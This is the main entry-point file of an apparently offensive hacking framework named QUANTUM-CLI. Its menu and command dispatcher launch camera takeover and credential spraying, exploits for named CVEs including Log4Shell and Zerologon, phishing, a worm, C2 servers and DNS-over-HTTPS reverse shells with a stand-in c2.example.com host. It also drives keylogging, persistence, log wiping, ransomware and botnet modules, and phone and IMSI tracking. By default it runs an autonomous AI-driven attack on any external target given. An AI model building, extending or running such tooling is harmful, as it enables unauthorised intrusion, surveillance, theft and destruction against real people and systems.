"""quantum.__main__ — menu, camera console, and the main() CLI (spec section 15)."""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
import threading
import time
from datetime import datetime
from http.server import HTTPServer

from quantum.ai.bootstrap import DM
from quantum.ai.supervisor import AI_Supervisor
from quantum.camwar.brute_v3 import BruteEngineV3, PhishEngine
from quantum.camwar.engine import CAMWAR
from quantum.c2.agents.ghostdns import doh_task_check, generate_dns_agent
from quantum.c2.app import FEDERATION, make_c2, keygen
from quantum.c2.transport import (DoHC2BeaconServer, FoxAcid,
                                   QuantumInsert, SwitchboardICMP)
from quantum.c2.wsgi import run_c2
from quantum.core.deps import Fore
from quantum.core.env import (AGENT, MODELS_DIR, QCLI_DIR, load_env_file,
                              local_ip, local_scope)
from quantum.core.grayfish import GRAYFISH
from quantum.core.logging import MitreMapper, log
from quantum.core.opsec import OPSEC
from quantum.overlord.autonomous import AutonomousOverlord
from quantum.overlord.engines import (GODSUPREME, EpiScribe, MFP, Trinity,
                                      UnitedDrake, Wildfire, Somberknight)
from quantum.postexploit.footprint import (footprint_wipe_posix,
                                            footprint_wipe_windows)
from quantum.postexploit.killswitch import KILLSWITCH, kill_all_implants
from quantum.postexploit.kitlogger import stage_keylogger
from quantum.postexploit.persistx import persistx
from quantum.recon.fingerprint import Validator
from quantum.recon.scan import ReconModule
from quantum.weapons.legacy import zerologon_dump
from quantum.weapons.media_v3 import v3_mshtml_maldoc
from quantum.weapons.registry import ExploitOrchestrator
from quantum.weapons.techniques.cagebreak import cagebreak
from quantum.weapons.techniques.emojisms import emoji_decode, emoji_encode
from quantum.weapons.techniques.flashfill import flashfill
from quantum.weapons.techniques.macreset import macos_recovery_reset
from quantum.weapons.remote_v3 import (v3_citrix_path, v3_citrixbleed,
                                        v3_confluence_ognl, v3_ios_admin,
                                        v3_log4shell, v3_moveit_probe,
                                        v3_panos_cmd, v3_vcenter_upload,
                                        v3_weblogic_console)

NEEDS_TARGET = {"osint", "recon", "validator", "auto", "phish", "brute", "router",
                "worm", "camshot", "quantum", "cottonmouth", "zerocheck"}


def _qcli_dispatch(args):
    """Workflow tool surface — the CLI mirror of the Android QcliApi."""
    from quantum.recon.scan import ReconModule
    from quantum.recon.fingerprint import Validator
    from quantum.weapons.registry import registry

    def dispatch(cmd, params=None):
        params = params or {}
        ip = params.get("ip") or args.target or ""
        if cmd == "scan":
            hosts = ReconModule().scan(params.get("cidr", local_scope()))
            return {"hosts": [{"ip": h.get("ip"), "ports": h.get("ports", [])}
                             for h in hosts]}
        if cmd == "fingerprint":
            return ReconModule().fingerprint(ip)
        if cmd == "validator":
            return Validator().score(ip, ReconModule().fingerprint(ip))
        if cmd == "zerocheck":
            return {k: registry.fire(cve, ip)
                    for k, cve in [("log4shell", "CVE-2021-44228"),
                                   ("citrixbleed", "CVE-2023-4966"),
                                   ("panos", "CVE-2024-3400"),
                                   ("blueborne", "CVE-2017-0781")]}
        if cmd == "fire":
            return registry.fire(params.get("cve", ""), ip)
        if cmd == "camwar":
            return CAMWAR.pwn_network(params.get("cidr", local_scope()))
        if cmd == "brute":
            return BruteEngineV3().run({"ip": ip})
        if cmd == "mitre":
            return MitreMapper().map_audit()
        raise ValueError(f"unknown workflow tool: {cmd}")

    return dispatch


def _is_ipv4(s):
    return bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", s or ""))


def camera_console(cidr):
    """Manual camera war console. Zero AI required."""
    cw = CAMWAR
    cams = []
    while True:
        print(f"\n{Fore.LIGHTRED_EX}=== QUANTUM-CLI CAMERA CONSOLE — {cidr} ==={Fore.RESET}")
        print(" 1. Discover cameras (TCP + WS-Discovery)   2. Attack all (cred spray)")
        print(" 3. Snapshot all cracked                       4. PTZ nudge all cracked")
        print(" 5. Attack+snapshot+PTZ single IP              6. One-shot single IP (auto)")
        print(" 7. List state                                 0. Back")
        try: c = input("camwar> ").strip()
        except (EOFError, KeyboardInterrupt): return
        if c == "0": return
        if c == "1": cams = cw.discover(cidr)
        elif c == "2":
            for cam in cams: cw.attack_cam(cam)
        elif c == "3":
            for cam in cams:
                if cam.get("controlled"): cw.control_cam(cam, ptz=False)
        elif c == "4":
            for cam in cams:
                if cam.get("controlled"): cw.control_cam(cam, ptz=True)
        elif c == "5":
            cam = cw.identify(input("IP: ").strip())
            if cam["vendor"] or cam["rtsp"]:
                if cam["vendor"] is None: cam["vendor"] = "generic"
                cw.attack_cam(cam); cw.control_cam(cam, ptz=True)
        elif c == "6":
            print(json.dumps(cw.one_shot(input("IP: ").strip()), indent=2, default=str))
        elif c == "7":
            print(json.dumps(cams, indent=2, default=str))


def menu():
    while True:
        print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║  QUANTUM-CLI FINAL V3.1 — MANUAL CONSOLE (CAMERA-FIRST OPS)   ║
╚══════════════════════════════════════════════════════════════╝{Fore.RESET}
  {Fore.GREEN}CAMERAS{Fore.RESET}
   c. Camera console          11. Discover+control cameras (CIDR)
  {Fore.GREEN}RECON / OSINT{Fore.RESET}   1. Scan CIDR   2. Fingerprint   3. OSINT   4. Validate
  {Fore.GREEN}EXPLOITATION{Fore.RESET}    6. Auto-exploit (gated)  7. Force  8. Brute  9. Router
  {Fore.GREEN}POST-EXPLOIT{Fore.RESET}    10. Harvest host  12. Trinity capture  13. PCAP  15. Worm
  {Fore.GREEN}C2 / NETWORK{Fore.RESET}    19. Start C2  20. FOXACID  21. QUANTUM  22. ICMP listen
  {Fore.GREEN}V3 POST-EXP{Fore.RESET}     29. Zerocheck probe battery   30. Kill-switch arm/disarm
  {Fore.GREEN}AI / OPSEC{Fore.RESET}      23. Query AI  24. Tor  25. Seal  26. Unseal  27. Deploy local AI
  {Fore.GREEN}MODE{Fore.RESET}            28. FULLY AUTONOMOUS mode    0. Exit
""")
        try:
            ch = input(f"{Fore.CYAN}qcli>{Fore.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(); return
        if ch == "0": return
        try:
            if ch == "c":  camera_console(local_scope())
            elif ch == "1":  ReconModule().scan(input("CIDR: "))
            elif ch == "2":  print(json.dumps(ReconModule().fingerprint(input("Target IP: ")), indent=2, default=str))
            elif ch == "3":  print(json.dumps(ReconModule().osint(input("Domain: ")), indent=2, default=str))
            elif ch == "4":
                ip = input("Target IP: ")
                print(json.dumps(Validator().score(ip, ReconModule().fingerprint(ip)), indent=2))
            elif ch == "6":  print(json.dumps(ExploitOrchestrator().auto_exploit(input("Target IP: ")), indent=2, default=str))
            elif ch == "7":  print(json.dumps(ExploitOrchestrator().auto_exploit(input("Target IP: "), force=True), indent=2, default=str))
            elif ch == "8":  print(json.dumps(BruteEngineV3().run({"ip": input("Target IP: ")}), indent=2))
            elif ch == "9":  print(json.dumps(UnitedDrake().attack_router(input("Router IP: ")) or {}, indent=2))
            elif ch == "10":
                from quantum.postexploit.harvest import DataHarvester
                print(json.dumps(DataHarvester().harvest_host(input("Host label: ")), indent=2))
            elif ch == "11":
                cidr = input("CIDR: ") or local_scope()
                for cam in CAMWAR.discover(cidr):
                    if CAMWAR.attack_cam(cam): CAMWAR.control_cam(cam)
            elif ch == "12": Trinity(int(input("Seconds: ") or 30)).capture()
            elif ch == "13":
                from quantum.postexploit.harvest import DataHarvester
                print(json.dumps(DataHarvester().analyze_pcap(input("PCAP file: ")), indent=2))
            elif ch == "15":
                threading.Thread(target=GODSUPREME.hop_from, args=(input("Hop source IP: "),), daemon=True).start()
            elif ch == "19":
                keygen()
                def _read(p, alt):
                    fp = p if os.path.isabs(p) else os.path.join(QCLI_DIR, p)
                    return open(fp).read() if os.path.isfile(fp) else alt
                agents = {"default": _read(AGENT, "# agent file missing"),
                          "linux":   _read("ghostfang.sh", "# run posixagent first"),
                          "mac":     _read("ghostfang.sh", "# run posixagent first")}
                threading.Thread(target=lambda a=agents: run_c2(make_c2(a)), daemon=True).start()
                print("C2 on :8443 (waitress WSGI, background) — /s, /r, /ai, /dash, /kill, /federation/*")
            elif ch == "20":
                threading.Thread(target=FoxAcid().serve, daemon=True).start()
                print("FOXACID on :8081 (background)")
            elif ch == "21":
                q = QuantumInsert(input("Target IP: "), input("Gateway IP: ")); q.poison(); q.inject()
            elif ch == "22": print(json.dumps(SwitchboardICMP().listen(20), indent=2))
            elif ch == "23":
                r = AI_Supervisor().query(input("Prompt: "))
                print(r if r else "[AI unavailable — QBrain mode active]")
            elif ch == "24": OPSEC.ensure_tor()
            elif ch == "25": GRAYFISH.seal_dir()
            elif ch == "26": GRAYFISH.unseal_dir()
            elif ch == "27":
                model = DM.deploy_local_ai()
                print(json.dumps({"local_ai": model, "models_dir": MODELS_DIR}))
            elif ch == "28":
                scope = input("Scope CIDR (blank = autodetect): ") or None
                agg = input("Aggression balanced|aggressive|patient (default balanced): ") or "balanced"
                AutonomousOverlord(scope=scope, aggression=agg).run()
            elif ch == "29":
                ip = input("Target IP: ")
                print(json.dumps({"log4shell": v3_log4shell(ip), "citrixbleed": v3_citrixbleed(ip),
                                  "citrix_path": v3_citrix_path(ip), "panos": v3_panos_cmd(ip),
                                  "confluence": v3_confluence_ognl(ip), "weblogic": v3_weblogic_console(ip),
                                  "iosxe": v3_ios_admin(ip), "vcenter": v3_vcenter_upload(ip),
                                  "moveit": v3_moveit_probe(ip)}, indent=2, default=str))
            elif ch == "30":
                arm = input("Arm kill-switch (y=arm, n=disarm): ").lower().startswith("y")
                if arm:
                    print(json.dumps(kill_all_implants(wipe_first=True)))
                else:
                    KILLSWITCH["on"] = False
                    print("kill-switch disarmed")
            else:
                print("unknown option")
        except Exception as e:
            log(f"menu error: {e}", "ERR")


def main(argv=None):
    p = argparse.ArgumentParser(
        description="QUANTUM-CLI FINAL V3.1 — no args = fully autonomous (camera-first)")
    p.add_argument("cmd", nargs="?", default=None,
                   choices=["serve", "foxacid", "quantum", "recon", "osint", "auto",
                            "dohc2", "icmp", "trinity", "camwar", "cams", "wifi", "triage",
                            "mfp", "pcap", "camshot", "router", "worm", "episcribe",
                            "cottonmouth", "validator", "tor", "seal", "unseal", "brute",
                            "phish", "keygen", "deployai", "zerologon", "mitre", "federation",
                            "posixagent", "zerocheck", "mshtmaldoc", "flashfill", "emoji",
                            "macreset", "keylog", "wipe", "persist", "ghostdns", "cagebreak",
                            "agents", "skills", "workflows", "p0feed", "providers",
                            "exploitdb", "payloads", "badusb", "kev", "gitdork",
                            "lockknife", "tools",
                            "trackip", "trackimei", "trackphone",
                            "rat", "ransomware", "botnet", "ddos",
                            "messaging", "stego", "apn", "exif",
                            "darkweb", "dorks", "shodan", "map2d", "phantomdroid",
                            "bluetooth", "hid", "sdr", "imsi",
                            "dohshell", "listener"],
                   help="direct command (optional)")
    p.add_argument("--menu", action="store_true", help="manual console")
    p.add_argument("--scope", "-c", dest="cidr", help="autonomous/scan scope CIDR")
    p.add_argument("--target", "-t", help="external target CIDR/IP — run camera war on it "
                                          "AUTONOMOUSLY by default (add --manual for manual)")
    p.add_argument("--manual", action="store_true", help="with --target: manual camera console")
    p.add_argument("--camera-only", action="store_true",
                   help="autonomous mode restricted to camera operations")
    p.add_argument("--no-ai", action="store_true",
                   help="run fully deterministic (QBrain) — no AI prompts, no model downloads")
    p.add_argument("--cycles", type=int, default=0, help="autonomous cycle cap (0=infinite)")
    p.add_argument("--aggression", default="balanced", choices=["balanced", "aggressive", "patient"])
    p.add_argument("--model", help="pin local AI model (overrides adaptive selection)")
    p.add_argument("--kill", action="store_true",
                   help="with 'serve'less direct run: arm the kill-switch against live C2 via /kill")
    p.add_argument("--domain", help="operator-controlled domain for DoH egress beacons (ghostdns)")
    p.add_argument("-q", "--query", help="search query (exploitdb/payloads/badusb/kev/gitdork)")
    p.add_argument("--get", dest="get_id", help="fetch one record by id (exploitdb/badusb)")
    p.add_argument("--section", help="payloads_all section (payloads)")
    p.add_argument("--repo", help="gitdork scope (owner/repo)")
    p.add_argument("--user", help="gitdork scope (user/org)")
    p.add_argument("--os", dest="os_filter",
                   choices=["windows", "macos", "linux"], help="badusb OS filter")
    p.add_argument("--sync", action="store_true",
                   help="catalog sync (exploitdb/payloads)")
    p.add_argument("--out", dest="out_path", help="output file (badusb export)")
    p.add_argument("-g", "--gateway"); p.add_argument("--iface")
    p.add_argument("--peer", help="federation peer .onion to sync")
    p.add_argument("-dc-ip"); p.add_argument("-dc-name"); p.add_argument("-d")
    p.add_argument("-f", "--file"); p.add_argument("--force", action="store_true")
    a = p.parse_args(argv)

    if a.no_ai:
        os.environ["QCLI_NO_AI"] = "1"
        AI_Supervisor.ai_dead = True

    # ---- sanity guards for direct commands ----
    if a.cmd in NEEDS_TARGET and not a.target:
        print(f"error: command '{a.cmd}' needs -t/--target (IP or CIDR)"); return
    if a.cmd == "pcap" and not a.file:
        print("error: command 'pcap' needs -f/--file <pcap path>"); return

    # ---- AI bootstrap: .env -> 5s prompt -> search/deploy local model in dir ----
    sup = AI_Supervisor()
    if a.model:
        os.environ["QCLI_PINNED_MODEL"] = a.model
    try:
        sup.bootstrap()
    except Exception as e:
        log(f"AI bootstrap issue (continuing — QBrain fallback available): {e}", "WARN")

    # -------- external target: autonomous camera war BY DEFAULT --------
    if a.target:
        if "/" in a.target:
            cidr = a.target
        elif _is_ipv4(a.target):
            cidr = a.target.rsplit(".", 1)[0] + ".0/24"
        else:
            cidr = a.target
        log(f"EXTERNAL target given: {cidr}", "AUTO")
        if a.manual:
            camera_console(cidr)
        else:
            AutonomousOverlord(scope=cidr, aggression=a.aggression,
                                camera_only=a.camera_only).run()
        return

    if not a.cmd and not a.menu:
        AutonomousOverlord(scope=a.cidr, cycles=a.cycles, aggression=a.aggression,
                           camera_only=a.camera_only).run()
        return

    if a.menu:
        menu(); return

    if   a.cmd == "keygen":     keygen(a.force); return
    elif a.cmd == "deployai":
        print(json.dumps({"local_ai": DM.deploy_local_ai(a.model), "models_dir": MODELS_DIR})); return
    elif a.cmd == "tor":        OPSEC.ensure_tor(); return
    elif a.cmd == "seal":       GRAYFISH.seal_dir(); return
    elif a.cmd == "unseal":     GRAYFISH.unseal_dir(); return
    elif a.cmd == "serve":
        keygen()
        def _read(p, alt):
            fp = p if os.path.isabs(p) else os.path.join(QCLI_DIR, p)
            return open(fp).read() if os.path.isfile(fp) else alt
        agents = {"default": _read(AGENT, "# agent file missing"),
                  "linux":   _read("ghostfang.sh", "# run posixagent first"),
                  "mac":     _read("ghostfang.sh", "# run posixagent first")}
        run_c2(make_c2(agents)); return
    elif a.cmd == "foxacid":    FoxAcid().serve(); return
    elif a.cmd == "quantum":
        q = QuantumInsert(a.target, a.gateway); q.poison()
        threading.Thread(target=q.inject, daemon=True).start(); time.sleep(70); return
    elif a.cmd == "mitre":     print(json.dumps(MitreMapper().map_audit(), indent=2)); return
    elif a.cmd == "federation":
        if a.peer: print(json.dumps({"merged": FEDERATION.pull(a.peer)})); return
        print(json.dumps({"onion": FEDERATION.start_hidden_service()})); return
    elif a.cmd == "posixagent":
        from quantum.c2.agents.ghostfang import generate_posix_agent
        print(json.dumps({"agent": generate_posix_agent(a.target or local_ip())})); return
    elif a.cmd == "ghostdns":
        domain = a.domain or load_env_file().get("QCLI_DOMAIN") or os.environ.get("QCLI_DOMAIN")
        if not domain:
            print("usage: quantum_cli.py ghostdns --domain yourdomain.tld "
                  "(also honored via .env QCLI_DOMAIN)"); return
        print(json.dumps({"agent": generate_dns_agent(domain),
                          "task_check": doh_task_check(domain)})); return
    elif a.cmd == "osint":     print(json.dumps(ReconModule().osint(a.target), indent=2, default=str)); return
    elif a.cmd == "recon":     print(json.dumps(ReconModule().fingerprint(a.target), indent=2, default=str)); return
    elif a.cmd == "validator": print(json.dumps(Validator().score(a.target, ReconModule().fingerprint(a.target)), indent=2)); return
    elif a.cmd == "auto":      print(json.dumps(ExploitOrchestrator().auto_exploit(a.target, force=a.force), indent=2, default=str)); return
    elif a.cmd == "zerocheck": print(json.dumps({"log4shell": v3_log4shell(a.target),
                                                 "citrixbleed": v3_citrixbleed(a.target),
                                                 "citrix_path": v3_citrix_path(a.target),
                                                 "panos": v3_panos_cmd(a.target),
                                                 "confluence": v3_confluence_ognl(a.target),
                                                 "weblogic": v3_weblogic_console(a.target),
                                                 "iosxe": v3_ios_admin(a.target),
                                                 "vcenter": v3_vcenter_upload(a.target),
                                                 "moveit": v3_moveit_probe(a.target)},
                                                indent=2, default=str)); return
    elif a.cmd == "mshtmaldoc": print(json.dumps(v3_mshtml_maldoc(local_ip()), default=str)); return
    elif a.cmd == "flashfill": print(json.dumps(flashfill())); return
    elif a.cmd == "emoji":
        try:
            msg = input("Message: ") or "ping"
        except EOFError:
            msg = "ping"
        print(emoji_encode(msg)); print("DECODED CHECK:", emoji_decode(emoji_encode(msg))); return
    elif a.cmd == "macreset":  print(json.dumps({"script": macos_recovery_reset()})); return
    elif a.cmd == "keylog":    print(json.dumps({"staged": stage_keylogger()})); return
    elif a.cmd == "wipe":
        print(json.dumps(footprint_wipe_windows() if os.name == "nt" else footprint_wipe_posix())); return
    elif a.cmd == "persist":   print(json.dumps(persistx())); return
    elif a.cmd == "cagebreak": print(json.dumps(cagebreak(), indent=2, default=str)); return
    elif a.cmd == "zerologon":
        if not (a.dc_ip and a.dc_name):
            print("usage: quantum_cli.py zerologon -dc-ip <ip> -dc-name <name> -d <domain>"); return
        print(json.dumps({"dumped": zerologon_dump(a.dc_ip, a.dc_name, a.domain or "corp.local")})); return
    elif a.cmd == "dohc2":     HTTPServer(("0.0.0.0", 5353), DoHC2BeaconServer).serve_forever(); return
    elif a.cmd == "icmp":      print(json.dumps(SwitchboardICMP().listen(20), indent=2)); return
    elif a.cmd == "trinity":   Trinity().capture(); return
    elif a.cmd == "wifi":      print(json.dumps(Somberknight().sweep(), indent=2)); return
    elif a.cmd == "triage":    print(json.dumps(Wildfire().triage(), indent=2, default=str)); return
    elif a.cmd == "mfp":       print(json.dumps({"persisted": MFP().persist()})); return
    elif a.cmd == "pcap":
        from quantum.postexploit.harvest import DataHarvester
        print(json.dumps(DataHarvester().analyze_pcap(a.file), indent=2)); return
    elif a.cmd == "camwar":
        print(json.dumps(CAMWAR.pwn_network(a.cidr or a.target or local_scope()), indent=2)); return
    elif a.cmd == "cams":
        cams = CAMWAR.discover(a.cidr or a.target or local_scope())
        for cam in cams:
            if CAMWAR.attack_cam(cam): CAMWAR.control_cam(cam)
        return
    elif a.cmd == "camshot":
        print(json.dumps(CAMWAR.one_shot(a.target), indent=2, default=str)); return
    elif a.cmd == "router":    print(json.dumps(UnitedDrake().attack_router(a.target) or {}, indent=2)); return
    elif a.cmd == "worm":
        t = threading.Thread(target=GODSUPREME.hop_from, args=(a.target,), daemon=True)
        t.start(); t.join(); return
    elif a.cmd == "episcribe":
        e = EpiScribe()
        if a.target: e.add_selector(a.target)
        e.watch(duration=300); print(json.dumps(e.events, indent=2)); return
    elif a.cmd == "cottonmouth":
        from quantum.c2.agents.ghostfang import CottonMouth
        print(json.dumps({"staged": CottonMouth().stage_payload(a.target or local_ip())})); return
    elif a.cmd == "brute":     print(json.dumps(BruteEngineV3().run({"ip": a.target}), indent=2)); return
    elif a.cmd == "phish":     print(json.dumps(PhishEngine().launch({"target_email": a.target}), indent=2, default=str)); return
    elif a.cmd == "agents":
        from quantum.ai.agents import load_all, get as agent_get
        if a.target and a.target.startswith("id:"):
            print(json.dumps(agent_get(a.target[3:]), indent=2, default=str)); return
        print(json.dumps(list(load_all().values()), indent=2, default=str)); return
    elif a.cmd == "skills":
        from quantum.ai.skills import load_all, compose_prompt
        if a.target and a.target.startswith("compose:"):
            print(compose_prompt(a.target[8:].split(","))); return
        print(json.dumps(list(load_all().values()), indent=2, default=str)); return
    elif a.cmd == "workflows":
        from quantum.ai.workflows import load_all, get as wf_get, run as wf_run
        if a.target and a.target.startswith("run:"):
            wf = wf_get(a.target[4:])
            if not wf:
                print(f"error: workflow '{a.target[4:]}' not found"); return
            print(json.dumps(wf_run(wf, dispatch=_qcli_dispatch(a)), indent=2, default=str)); return
        print(json.dumps(list(load_all().values()), indent=2, default=str)); return
    elif a.cmd == "p0feed":
        from quantum.recon.project_zero import zero_day_candidates, as_markdown, latest
        if a.force:
            print(json.dumps(zero_day_candidates(n=20), indent=2, default=str)); return
        print(as_markdown(latest(n=15))); return
    elif a.cmd == "providers":
        from quantum.ai.providers import provider_status
        print(json.dumps(provider_status(), indent=2, default=str)); return
    elif a.cmd == "exploitdb":
        from quantum.catalog import exploitdb as edb
        if a.sync:
            print(json.dumps(edb.sync(), indent=2, default=str)); return
        if a.get_id:
            print(json.dumps(edb.get(a.get_id), indent=2, default=str)); return
        if a.query:
            print(json.dumps(edb.search(a.query, limit=25), indent=2,
                              default=str)); return
        print(json.dumps(edb.stats(), indent=2, default=str)); return
    elif a.cmd == "payloads":
        from quantum.catalog import payloads_all as patt
        if a.sync:
            print(json.dumps(patt.sync(), indent=2, default=str)); return
        if a.section:
            print(json.dumps(patt.get_payload(a.section, a.file),
                             indent=2, default=str)); return
        if a.query:
            print(json.dumps(patt.search(a.query), indent=2, default=str)); return
        print(json.dumps(patt.stats(), indent=2, default=str)); return
    elif a.cmd == "badusb":
        from quantum.catalog import badusb
        if a.get_id:
            r = badusb.get(a.get_id)
            if a.out_path and r.get("ok"):
                r = badusb.export(a.get_id, a.out_path)
            print(json.dumps(r, indent=2, default=str)); return
        if a.query:
            print(json.dumps(badusb.search(a.query), indent=2, default=str)); return
        print(json.dumps(badusb.list_payloads(os_filter=a.os_filter),
                         indent=2, default=str)); return
    elif a.cmd == "kev":
        from quantum.recon import kev
        if a.query:
            print(json.dumps(kev.lookup(a.query), indent=2, default=str)); return
        print(json.dumps(kev.check_kev(), indent=2, default=str)); return
    elif a.cmd == "gitdork":
        from quantum.recon import gitdork
        if not (a.repo or a.user):
            print(json.dumps(gitdork.list_dorks(), indent=2, default=str)); return
        print(json.dumps(gitdork.scan(repo=a.repo, user=a.user,
                                      max_dorks=None if a.force else 10),
                         indent=2, default=str)); return
    elif a.cmd == "lockknife":
        from quantum.weapons.techniques import lockknife
        if a.query == "connect" and a.target:
            print(json.dumps(lockknife.connect(a.target), indent=2,
                             default=str)); return
        if a.query == "packages":
            print(json.dumps(lockknife.extract_packages(), indent=2,
                             default=str)); return
        if a.query == "settings":
            print(json.dumps(lockknife.extract_settings(), indent=2,
                             default=str)); return
        if a.query == "report":
            print(json.dumps(lockknife.full_report(), indent=2,
                             default=str)); return
        print(json.dumps(lockknife.devices(), indent=2, default=str)); return
    elif a.cmd == "tools":
        from quantum.ops import tools
        if a.query:
            print(json.dumps(tools.detect(a.query), indent=2, default=str)); return
        print(json.dumps(tools.detect_all(), indent=2, default=str)); return
    elif a.cmd == "trackip":
        from quantum.recon.trackers import track_ip_downloads
        print(json.dumps(track_ip_downloads(a.target), indent=2, default=str)); return
    elif a.cmd == "trackimei":
        from quantum.recon.trackers import track_imei
        print(json.dumps(track_imei(a.target), indent=2, default=str)); return
    elif a.cmd == "trackphone":
        from quantum.recon.trackers import track_phone_location
        print(json.dumps(track_phone_location(a.target), indent=2, default=str)); return
    elif a.cmd == "rat":
        from quantum.control.rat import rat_dashboard_state, list_rat_repos, mspy_feature_list, messaging_app_list
        if a.query == "repos":
            print(json.dumps(list_rat_repos(), indent=2, default=str)); return
        if a.query == "features":
            print(json.dumps({"features": mspy_feature_list(), "messaging_apps": messaging_app_list()}, indent=2)); return
        print(json.dumps(rat_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "ransomware":
        from quantum.control.ransomware import ransomware_dashboard_state, list_ransomware_tools, list_deployment_modules
        if a.query == "tools":
            print(json.dumps(list_ransomware_tools(), indent=2, default=str)); return
        if a.query == "modules":
            print(json.dumps(list_deployment_modules(), indent=2, default=str)); return
        print(json.dumps(ransomware_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "botnet":
        from quantum.control.botnet import botnet_dashboard_state, list_botnet_types, list_botnet_capabilities
        if a.query == "types":
            print(json.dumps(list_botnet_types(), indent=2, default=str)); return
        if a.query == "capabilities":
            print(json.dumps(list_botnet_capabilities(), indent=2, default=str)); return
        print(json.dumps(botnet_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "ddos":
        from quantum.control.ddos import ddos_dashboard_state, list_ddos_tools, list_ddos_techniques
        if a.query == "tools":
            print(json.dumps(list_ddos_tools(), indent=2, default=str)); return
        if a.query == "techniques":
            print(json.dumps(list_ddos_techniques(), indent=2, default=str)); return
        print(json.dumps(ddos_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "messaging":
        from quantum.social.messaging import messaging_dashboard_state, list_messaging_platforms, list_social_engineering_techniques
        if a.query == "platforms":
            print(json.dumps(list_messaging_platforms(), indent=2, default=str)); return
        if a.query == "techniques":
            print(json.dumps(list_social_engineering_techniques(), indent=2, default=str)); return
        print(json.dumps(messaging_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "stego":
        from quantum.exploits.steganography import steganography_dashboard_state, list_steganography_methods, list_pdf_exploit_methods
        if a.query == "methods":
            print(json.dumps(list_steganography_methods(), indent=2, default=str)); return
        if a.query == "pdf":
            print(json.dumps(list_pdf_exploit_methods(), indent=2, default=str)); return
        print(json.dumps(steganography_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "apn":
        from quantum.exploits.apn import apn_dashboard_state, list_apn_hardware, list_apn_attack_methods
        if a.query == "hardware":
            print(json.dumps(list_apn_hardware(), indent=2, default=str)); return
        if a.query == "methods":
            print(json.dumps(list_apn_attack_methods(), indent=2, default=str)); return
        print(json.dumps(apn_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "exif":
        from quantum.recon.exif import exif_dashboard_state, analyze_exif
        if a.target:
            print(json.dumps(analyze_exif(a.target), indent=2, default=str)); return
        print(json.dumps(exif_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "darkweb":
        from quantum.markets.darkweb import darkweb_dashboard_state, list_onion_services
        if a.query == "services":
            print(json.dumps(list_onion_services(), indent=2, default=str)); return
        print(json.dumps(darkweb_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "dorks":
        from quantum.recon.dorks import dorks_dashboard_state, list_dork_categories
        if a.query == "categories":
            print(json.dumps(list_dork_categories(), indent=2, default=str)); return
        print(json.dumps(dorks_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "shodan":
        from quantum.recon.shodan import shodan_dashboard_state, list_shodan_presets
        if a.query == "presets":
            print(json.dumps(list_shodan_presets(), indent=2, default=str)); return
        print(json.dumps(shodan_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "map2d":
        from quantum.control.map2d import map2d_dashboard_state
        print(json.dumps(map2d_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "phantomdroid":
        from quantum.control.phantomdroid import phantomdroid_dashboard_state, discover_adb_devices, list_phantomdroid_features
        if a.query == "devices":
            print(json.dumps(discover_adb_devices(), indent=2, default=str)); return
        if a.query == "features":
            print(json.dumps(list_phantomdroid_features(), indent=2, default=str)); return
        print(json.dumps(phantomdroid_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "bluetooth":
        from quantum.control.bluetooth import (bluetooth_dashboard_state,
                                               download_bluetooth_drivers,
                                               scan_devices)
        if a.query == "scan":
            print(json.dumps(scan_devices(), indent=2, default=str)); return
        if a.query == "drivers":
            print(json.dumps(download_bluetooth_drivers(), indent=2, default=str)); return
        print(json.dumps(bluetooth_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "hid":
        from quantum.control.hid import (hid_dashboard_state,
                                         download_hid_drivers,
                                         hid_raw_devices)
        if a.query == "raw":
            print(json.dumps(hid_raw_devices(), indent=2, default=str)); return
        if a.query == "drivers":
            print(json.dumps(download_hid_drivers(), indent=2, default=str)); return
        print(json.dumps(hid_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "sdr":
        from quantum.control.sdr import (sdr_dashboard_state,
                                         download_sdr_drivers,
                                         probe_radios)
        if a.query == "probe":
            print(json.dumps(probe_radios(), indent=2, default=str)); return
        if a.query == "drivers":
            print(json.dumps(download_sdr_drivers(), indent=2, default=str)); return
        print(json.dumps(sdr_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "imsi":
        from quantum.control.imsi import (imsi_dashboard_state,
                                          download_imsi_drivers,
                                          read_imsi)
        if a.query == "read":
            print(json.dumps(read_imsi(a.target or ""), indent=2, default=str)); return
        if a.query == "drivers":
            print(json.dumps(download_imsi_drivers(), indent=2, default=str)); return
        print(json.dumps(imsi_dashboard_state(), indent=2, default=str)); return
    elif a.cmd == "dohshell":
        from quantum.c2.reverseshell import (
            generate_doh_reverse_shell_agent,
            generate_windows_doh_reverse_shell,
            DoHBeaconReceiver,
            generate_android_c2_config,
        )
        if a.query == "windows":
            fn = generate_windows_doh_reverse_shell(a.domain or "c2.example.com", a.target or "192.168.1.1:8443")
            print(json.dumps({"agent": fn, "platform": "windows"}, indent=2)); return
        if a.query == "targets":
            receiver = DoHBeaconReceiver(a.domain or "c2.example.com")
            print(json.dumps(receiver.get_active_targets(), indent=2, default=str)); return
        if a.query == "task":
            receiver = DoHBeaconReceiver(a.domain or "c2.example.com")
            task = receiver.push_task(a.target or "hq", "shell", {"c2_host": a.domain or "c2.example.com", "c2_port": 8443})
            print(json.dumps(task, indent=2, default=str)); return
        if a.query == "config":
            print(json.dumps(generate_android_c2_config(a.domain or "c2.example.com"), indent=2)); return
        fn = generate_doh_reverse_shell_agent(a.domain or "c2.example.com", a.target or "192.168.1.1:8443")
        print(json.dumps({"agent": fn, "platform": "posix"}, indent=2)); return
    elif a.cmd == "listener":
        from quantum.c2.listener import ListenerManager
        mgr = ListenerManager()
        if a.query == "stop":
            ok = mgr.stop(a.target)
            print(json.dumps({"stopped": ok, "port": a.target}, indent=2)); return
